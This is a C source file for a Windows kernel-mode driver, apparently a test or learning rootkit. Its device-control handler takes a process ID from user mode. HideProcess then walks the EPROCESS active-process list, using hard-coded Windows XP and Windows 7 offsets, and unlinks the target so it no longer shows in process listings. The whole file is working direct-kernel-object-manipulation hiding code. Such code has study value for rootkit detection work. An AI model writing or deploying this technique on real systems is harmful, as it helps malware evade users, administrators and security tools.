#include <stdlib.h>

#include "MJDeviceControl.h"

NTSTATUS
TestDriverDeviceControl(
	PDEVICE_OBJECT pDeviceObject, 
	PIRP pIrp
	)
/*++
Routine Description:
    This routine looks for the calling process EPROCESS structure 
	and unlink or relink it from/to the EPROCESSs Linked List

Arguments:
    DeviceObject - our driver device object.
    pIrp - pointer to the IRP associated with this dispatch

Return Value:
    STATUS_SUCCESS if successful
--*/
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION pIoStack = IoGetCurrentIrpStackLocation(pIrp);
	PCHAR pInputBuffer = pIoStack->Parameters.DeviceIoControl.Type3InputBuffer;;

	switch(pIoStack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_TESTDRIVER_HIDE_PROCESS:						
		DbgPrint("[~] From usermode: %s\n", pInputBuffer);
		
		if(!HideProcess(atoi(pInputBuffer))) status = STATUS_ACCESS_VIOLATION;		
		DbgPrint("[*] Found EProcess at 0x%p\n", PsGetCurrentProcess());
		break;
		
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;

		DbgPrint("[!] Received unknown code 0x%08X\n", 
            pIoStack->Parameters.DeviceIoControl.IoControlCode);

		break;
	}

	if(status != STATUS_PENDING) {
		pIrp->IoStatus.Status = status;
		pIrp->IoStatus.Information = 0;
		IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	}

	return(status);
}


BOOLEAN
HideProcess(	
    int pid                     // PID to hide
	)
{
	RTL_OSVERSIONINFOW OSInformation = {0};	
	PEPROCESS pNextProcess = NULL;
	BOOLEAN status = TRUE;
	NTSTATUS ntstatus = STATUS_SUCCESS;
    PEPROCESS pEProcess = NULL;             // current calling process
    
    // Offsets into EPROCESS struct    
    int OFFSET_PID = 0;
    int OFFSET_NAME = 0;
    int OFFSET_FLINK = 0;
    
    // Used in active processes iteration
    int nextPid = 0;
    char *imageName = NULL;        		
    PLIST_ENTRY plist_active_procs = NULL;
    
    DbgPrint("[DBG] Try to hide process with PID: %d\n", pid);
    
    // Use PsGetCurrentProcess to get the ptr to the calling process EPROCESS		
    pEProcess = PsGetCurrentProcess();
    
	OSInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
	ntstatus = RtlGetVersion(&OSInformation);

    // EPROCESS definition differs between different versions of windows dwBuildNumber
	if(NT_SUCCESS(ntstatus)) 
		DbgPrint("TestDriver - HideProcess() - OS Version INFO\n\t"
                "Major Version: %lu\n\t"
                "Minor Version: %lu\n\t"
                "Build Number: %lu\n\t"
                "Platform ID: %lu\n\t"
                "Service Pack: %.128S\n",
                OSInformation.dwMajorVersion,
                OSInformation.dwMinorVersion,
                OSInformation.dwBuildNumber,
                OSInformation.dwPlatformId,
                OSInformation.szCSDVersion
                );

    switch (OSInformation.dwBuildNumber) {
    case 2600:  //WXP
        OFFSET_PID = WXP_OFFSET_UniqueProcessId;
        OFFSET_NAME = WXP_OFFSET_ImageFileName;
        OFFSET_FLINK = WXP_OFFSET_ActiveProcessLinks;
        break;
    case 7601:  // W7
    default:
        OFFSET_PID = W7_OFFSET_UniqueProcessId;
        OFFSET_NAME = W7_OFFSET_ImageFileName;
        OFFSET_FLINK = W7_OFFSET_ActiveProcessLinks;
        break;
    }
    pNextProcess = pEProcess;   
    DbgPrint("[*] Enumerating found processes:\n");		        
    while ((nextPid != pid) && (NULL != pNextProcess)) {
        // Get the pid
        nextPid = *(int *)((char*)pNextProcess + OFFSET_PID);
                    
        // Get the process name
        imageName = (char*)((char*)pNextProcess + OFFSET_NAME);
        DbgPrint("[+] PID: %u\t Name: %.16s\n", nextPid, imageName);
                    
        // Get next process from the forward link			
        plist_active_procs = (LIST_ENTRY *) ((char*)pNextProcess + OFFSET_FLINK);
        pNextProcess = (char*)(plist_active_procs->Flink);
        pNextProcess = (char*)pNextProcess - OFFSET_FLINK;
        
        if(pNextProcess == pEProcess) {
            DbgPrint("[*] Whole EPROCESS list cycled. Break\n");
            break;
        }
    } 
    if ((NULL == pNextProcess) || (pid != nextPid)) {
        DbgPrint("No process with PID %d found.\n", pid);
    } else {            
        DbgPrint("Found process %s with pid %d. Unlinking it.\n", 
            imageName, pid);
    
        plist_active_procs->Blink->Flink = plist_active_procs->Flink;
        plist_active_procs->Flink->Blink = plist_active_procs->Blink;
    }

	return(status);
}
